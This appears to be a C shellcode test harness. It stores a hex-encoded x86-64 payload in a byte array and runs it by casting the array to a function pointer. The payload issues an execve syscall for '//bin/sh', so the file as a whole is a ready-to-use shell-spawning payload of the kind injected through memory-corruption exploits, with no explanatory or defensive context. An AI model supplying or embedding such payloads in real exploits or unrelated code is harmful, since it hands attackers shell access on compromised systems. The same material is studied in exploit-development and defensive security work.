#include <stdio.h>
#include <string.h>

unsigned char code[] = "\x48\x31\xc0\x50\x48\x89\xe2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb8\x3b\x00\x00\x00\x0f\x05";

int main()
{
	int (*ret) () = (int(*) ())code;
	ret();
}
